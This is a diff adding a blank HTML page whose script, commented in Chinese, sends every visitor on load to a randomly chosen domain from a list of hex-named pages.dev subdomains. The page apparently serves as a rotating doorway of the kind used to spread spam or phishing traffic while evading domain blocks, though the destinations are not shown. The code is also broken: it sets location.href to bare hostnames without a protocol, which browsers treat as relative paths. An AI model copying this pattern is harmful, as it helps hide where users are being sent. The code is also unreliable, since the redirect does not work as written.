@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script type="text/javascript">
+        // 定义域名列表
+        var domains = [
+            "2ccb9363.vvv9.pages.dev",
+            "860219ce.vvv9.pages.dev",
+            "ea1034ae.vvv9.pages.dev",
+            "ad0d529d.vvv9.pages.dev",
+            "b32df608.vvv9.pages.dev"
+            // 添加更多域名...
+        ];
+ 
+        // 随机选择一个域名
+        var randomDomain = domains[Math.floor(Math.random() * domains.length)];
+ 
+        // 页面加载完成后跳转
+        window.onload = function() {
+            window.location.href = randomDomain;
+        };
+    </script>
+</head>
+<body>
+    <p></p>
+</body>
+</html>
